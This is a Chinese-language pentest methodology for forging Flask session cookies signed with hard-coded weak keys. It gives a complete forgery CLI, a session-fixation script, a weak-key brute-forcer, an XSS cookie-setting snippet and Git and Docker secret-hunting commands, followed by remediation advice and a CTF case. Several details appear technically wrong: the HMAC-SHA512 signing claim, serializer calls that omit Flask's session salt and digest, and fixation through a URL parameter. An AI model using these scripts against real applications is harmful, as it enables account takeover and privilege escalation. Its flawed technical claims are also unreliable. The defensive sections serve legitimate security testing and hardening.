# Flask 弱密钥会话伪造攻击

## 1. 方法论概述

### 1.1 编写目的
本方法论指导渗透测试人员识别和利用 Flask 应用中硬编码弱密钥导致的会话伪造漏洞，包括会话 Cookie 伪造、Flash 消息注入和会话固定攻击。

### 1.2 适用范围
- Flask 应用使用客户端会话（Client-side Sessions）
- SECRET_KEY 硬编码在源代码中
- SECRET_KEY 熵值不足（弱密钥）
- 无会话签名验证机制

### 1.3 读者对象
- 渗透测试工程师
- Python/Flask 安全研究人员
- 代码审计人员

---

## 2. 技术原理

### 2.1 Flask 会话机制

**会话签名流程：**
```
用户数据 → JSON 序列化 → Base64 编码 → HMAC-SHA512 签名 → Session Cookie
```

**Cookie 格式：**
```
eyJ1c2VyIjoiYWRtaW4ifQ.Xb8vZw.签名部分
│                        │       │
├─ Payload (Base64)       │       └─ HMAC 签名
└─ 时间戳（可选）
```

### 2.2 弱密钥问题

**典型弱密钥示例：**
```python
# ❌ 极弱密钥（硬编码在代码中）
app.secret_key = 'supersecretkey'
app.secret_key = 'secret'
app.secret_key = 'your_secret_key'
app.secret_key = '123456'

# ✅ 安全密钥（从环境变量读取）
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24))
```

**弱密钥特征：**
- 长度小于 32 字节
- 使用常见单词/短语
- 确定性生成（无随机性）
- 提交到版本控制

### 2.3 攻击原理

**itsdangerous 库签名机制：**
```python
from itsdangerous import URLSafeTimedSerializer

# 攻击者使用已知密钥伪造会话
serializer = URLSafeTimedSerializer('supersecretkey')
forged_token = serializer.dumps({'user': 'admin', 'role': 'admin'})
```

---

## 3. 攻击场景

### 3.1 场景 1：Flash 消息注入

**目标：** 在应用中显示攻击者控制的 Flash 消息

**攻击步骤：**

1. **识别密钥**
   ```bash
   # 搜索源代码
   grep -r "secret_key" .
   grep -r "SECRET_KEY" .
   ```

2. **伪造会话 Cookie**
   ```python
   #!/usr/bin/env python3
   from itsdangerous import URLSafeTimedSerializer
   
   SECRET_KEY = 'supersecretkey'
   
   # 创建序列化器
   serializer = URLSafeTimedSerializer(SECRET_KEY)
   
   # 构造恶意 Flash 消息
   flash_data = [{'error': 'Malicious flash message injected!'}]
   session_data = {'_flashes': flash_data}
   
   # 生成伪造的会话 Cookie
   forged_cookie = serializer.dumps(session_data)
   print(f"Forged Cookie: session={forged_cookie}")
   ```

3. **发送请求**
   ```bash
   curl -H "Cookie: session=eyJfZmxhc2hlcyI6W1siZXJyb3IiLCJNYWxpY2lvdXMgZmxhc2ggbWVzc2FnZSJdfQ.signature" \
     http://localhost:42369/
   ```

**预期结果：**
```html
<ul>
    <li>Malicious flash message injected!</li>
</ul>
```

### 3.2 场景 2：会话固定攻击

**目标：** 预先创建会话并固定在受害者浏览器中

**攻击步骤：**

1. **创建预定义会话**
   ```python
   from itsdangerous import URLSafeTimedSerializer
   
   SECRET_KEY = 'supersecretkey'
   serializer = URLSafeTimedSerializer(SECRET_KEY)
   
   # 创建包含跟踪数据的会话
   session_data = {
       '_flashes': [],
       'user_id': 'victim',
       'attacker_controlled': True
   }
   
   forged_cookie = serializer.dumps(session_data)
   ```

2. **诱导受害者使用会话**
   ```
   攻击链接：http://target/?session=FORGED_COOKIE
   
   或通过 XSS 设置 Cookie：
   <script>
   document.cookie = "session=FORGED_COOKIE; path=/";
   </script>
   ```

3. **受害者访问特权端点**
   - 受害者使用固定会话访问 /admin
   - 会话未轮换（无 session.clear()）
   - 攻击者可使用相同会话

### 3.3 场景 3：权限提升

**目标：** 伪造管理员会话

**攻击步骤：**

1. **分析会话结构**
   ```python
   from itsdangerous import URLSafeTimedSerializer
   import base64
   import json
   
   # 解码现有会话
   cookie = "eyJ1c2VyIjoiZ3Vlc3QifQ.signature"
   payload = cookie.split('.')[0]
   # 添加填充
   payload += '=' * (4 - len(payload) % 4)
   data = json.loads(base64.urlsafe_b64decode(payload))
   print(data)  # {'user': 'guest'}
   ```

2. **伪造管理员会话**
   ```python
   SECRET_KEY = 'supersecretkey'
   serializer = URLSafeTimedSerializer(SECRET_KEY)
   
   # 提升权限
   admin_data = {
       'user': 'admin',
       'role': 'administrator',
       'is_admin': True,
       'permissions': ['read', 'write', 'delete']
   }
   
   forged_cookie = serializer.dumps(admin_data)
   ```

3. **使用伪造会话**
   ```bash
   curl -H "Cookie: session=$FORGED_COOKIE" \
     http://target/admin
   ```

---

## 4. 探测与验证

### 4.1 黑盒测试

**步骤 1：识别 Flask 应用**
```bash
# 检查响应头
curl -I http://target/

# 查找 Werkzeug/Flask 标识
Server: Werkzeug/3.0.6 Python/3.8.20
```

**步骤 2：检测会话 Cookie**
```bash
# 观察 Set-Cookie 头
curl -I http://target/

# Flask 默认会话 Cookie 名
Set-Cookie: session=eyJ...; HttpOnly; Path=/
```

**步骤 3：测试密钥强度**
```python
# 常见弱密钥字典
WEAK_KEYS = [
    'secret',
    'secret_key',
    'your_secret_key',
    'supersecretkey',
    'flask_secret_key',
    'dev',
    'development',
    'test',
    '123456',
    'password',
    'admin',
    'changeme'
]

from itsdangerous import URLSafeTimedSerializer, BadSignature

def test_key(cookie, key):
    try:
        serializer = URLSafeTimedSerializer(key)
        serializer.loads(cookie)
        return True
    except BadSignature:
        return False

# 暴力测试
for key in WEAK_KEYS:
    if test_key(known_cookie, key):
        print(f"[+] Found key: {key}")
```

### 4.2 白盒测试

**代码审计检查点：**

```python
# ❌ 检查硬编码密钥
grep -n "secret_key\s*=" app.py
grep -n "SECRET_KEY\s*=" config.py

# ❌ 检查弱密钥模式
grep -rn "'secret'" .
grep -rn "'supersecret'" .
grep -rn "'your_secret'" .

# ✅ 检查正确配置
grep -rn "os.urandom" .
grep -rn "os.environ.get.*SECRET" .
grep -rn "secrets.token_hex" .
```

**危险模式：**
```python
# 危险：硬编码密钥
app.secret_key = 'supersecretkey'

# 危险：低熵密钥
app.secret_key = 'abc123'

# 危险：提交到 Git
# .env 文件包含在版本控制中

# 安全：环境变量
app.secret_key = os.environ.get('SECRET_KEY')

# 安全：随机生成
app.secret_key = os.urandom(32)
```

---

## 5. 利用方法

### 5.1 自动化利用工具

**完整利用脚本：**
```python
#!/usr/bin/env python3
"""
Flask Session Forgery Tool
利用弱密钥伪造 Flask 会话 Cookie
"""

import argparse
from itsdangerous import URLSafeTimedSerializer

def forge_session(secret_key, data, timestamp=None):
    """伪造 Flask 会话 Cookie"""
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data, timestamp=timestamp)

def decode_session(cookie):
    """解码会话 Cookie（无需密钥）"""
    import base64
    import json
    
    try:
        payload = cookie.split('.')[0]
        # 添加 Base64 填充
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding
        
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        return f"Error: {e}"

def main():
    parser = argparse.ArgumentParser(description='Flask Session Forgery Tool')
    parser.add_argument('--key', required=True, help='Flask SECRET_KEY')
    parser.add_argument('--flash', help='Flash message to inject')
    parser.add_argument('--category', default='message', 
                        help='Flash category (message/error/warning)')
    parser.add_argument('--custom', help='Custom JSON data')
    
    args = parser.parse_args()
    
    if args.flash:
        data = {'_flashes': [(args.category, args.flash)]}
    elif args.custom:
        import json
        data = json.loads(args.custom)
    else:
        data = {'user': 'admin', 'role': 'administrator'}
    
    forged = forge_session(args.key, data)
    print(f"\n[+] Forged Session Cookie:")
    print(f"session={forged}")
    print(f"\n[+] Use with curl:")
    print(f'curl -H "Cookie: session={forged}" http://target/')

if __name__ == '__main__':
    main()
```

**使用示例：**
```bash
# 注入 Flash 消息
python3 forge_session.py --key 'supersecretkey' \
  --flash "Admin logged in" --category error

# 伪造管理员会话
python3 forge_session.py --key 'supersecretkey' \
  --custom '{"user":"admin","is_admin":true}'
```

### 5.2 会话固定攻击脚本

```python
#!/usr/bin/env python3
"""
Flask Session Fixation Attack
演示会话固定攻击
"""

from itsdangerous import URLSafeTimedSerializer
import requests

SECRET_KEY = 'supersecretkey'
TARGET = 'http://localhost:42369'

def create_fixed_session():
    """创建固定会话"""
    serializer = URLSafeTimedSerializer(SECRET_KEY)
    
    # 创建包含跟踪标记的会话
    session_data = {
        '_flashes': [],
        'attacker_session_id': 'FIXED_12345',
        'tracking': True
    }
    
    return serializer.dumps(session_data)

def attack():
    """执行会话固定攻击"""
    fixed_cookie = create_fixed_session()
    
    print(f"[*] Created fixed session: {fixed_cookie[:50]}...")
    print(f"[*] Attack URL: {TARGET}/?session={fixed_cookie}")
    print(f"[*] Or set via JavaScript:")
    print(f'    document.cookie = "session={fixed_cookie}; path=/";')
    
    # 验证会话有效
    response = requests.get(TARGET, cookies={'session': fixed_cookie})
    if response.status_code == 200:
        print("[+] Fixed session is valid!")

if __name__ == '__main__':
    attack()
```

---

## 6. 绕过技巧

### 6.1 密钥发现技巧

**Git 历史搜索：**
```bash
# 搜索 Git 历史中的密钥
git log -p --all -S "secret_key" -- "*.py"
git log -p --all -S "SECRET_KEY" -- "*.py"

# 搜索 .env 文件
git log -p --all -S "FLAG=" -- ".env"
```

**Docker 镜像检查：**
```bash
# 检查 Docker 镜像层
docker history --no-trunc target_image

# 提取镜像中的文件
docker run --rm target_image cat /app/app.py
```

**配置文件搜索：**
```bash
# 常见配置文件
find . -name "*.py" -o -name "*.env" -o -name "config*" -o -name "settings*"

# 搜索密钥模式
grep -r "secret" --include="*.py" --include="*.env" --include="*.conf"
```

### 6.2 会话数据操纵

**修改现有会话：**
```python
from itsdangerous import URLSafeTimedSerializer
import base64
import json

def modify_session(cookie, secret_key, modifications):
    """修改会话数据"""
    # 解码现有数据
    payload = cookie.split('.')[0]
    padding = 4 - len(payload) % 4
    payload += '=' * padding
    
    data = json.loads(base64.urlsafe_b64decode(payload))
    
    # 应用修改
    data.update(modifications)
    
    # 重新签名
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# 使用示例
old_cookie = "eyJ1c2VyIjoiZ3Vlc3QifQ.signature"
new_cookie = modify_session(old_cookie, 'supersecretkey', 
                            {'is_admin': True})
```

---

## 7. 影响评估

### 7.1 直接危害
- Flash 消息注入（社会工程攻击）
- 会话固定攻击
- 权限提升（如果会话存储角色信息）

### 7.2 潜在危害
- 完全账户接管（如果会话用于认证）
- CSRF 攻击增强
- 钓鱼攻击可信度提升

### 7.3 CVSS 评分参考
- **基础分数：** 7.5 (High)
- **攻击向量：** Network (AV:N)
- **攻击复杂度：** Low (AC:L)
- **权限要求：** None (PR:N)
- **用户交互：** None (UI:N)
- **机密性影响：** Low (C:L)
- **完整性影响：** Low (I:L)
- **可用性影响：** None (A:N)

---

## 8. 修复建议

### 8.1 密钥管理

**❌ 不安全：**
```python
app.secret_key = 'supersecretkey'
```

**✅ 安全：**
```python
import os
import secrets

# 方法 1：环境变量
app.secret_key = os.environ.get('SECRET_KEY')

# 方法 2：随机生成（每次重启变化）
app.secret_key = secrets.token_hex(32)

# 方法 3：密钥文件
with open('/secure/path/secret.key', 'rb') as f:
    app.secret_key = f.read()
```

### 8.2 会话安全配置

```python
# 安全会话配置
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,      # 防止 XSS 窃取
    SESSION_COOKIE_SECURE=True,        # 仅 HTTPS 传输
    SESSION_COOKIE_SAMESITE='Lax',     # 防止 CSRF
    PERMANENT_SESSION_LIFETIME=3600,   # 1 小时过期
    SESSION_REFRESH_EACH_REQUEST=False # 不自动续期
)
```

### 8.3 会话轮换

```python
# 登录后会话轮换
@app.route('/login', methods=['POST'])
def login():
    # ... 验证凭证 ...
    
    # 轮换会话
    session.clear()
    session['user_id'] = user.id
    session['is_authenticated'] = True
    
    return redirect('/dashboard')
```

---

## 9. 参考资源

- [Flask Security Documentation](https://flask.palletsprojects.com/en/2.3.x/security/)
- [itsdangerous Library Documentation](https://itsdangerous.palletsprojects.com/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

## 10. 实战案例

### 10.1 CTF 挑战案例

**目标：** Flask Markdown 转换器

**发现：**
```python
# app.py 第 8 行
app.secret_key = 'supersecretkey'
```

**利用：**
```bash
python3 forge_session.py --key 'supersecretkey' \
  --flash "System Error: Contact admin@company.com" --category error
```

**结果：** 成功注入恶意 Flash 消息

### 10.2 生产环境案例

**场景：** 内部 Flask 应用

**问题：**
- SECRET_KEY 硬编码为 'internal_app_secret_2020'
- 代码提交到 Git 仓库
- 会话存储用户角色信息

**影响：** 攻击者可通过 Git 历史获取密钥，伪造管理员会话
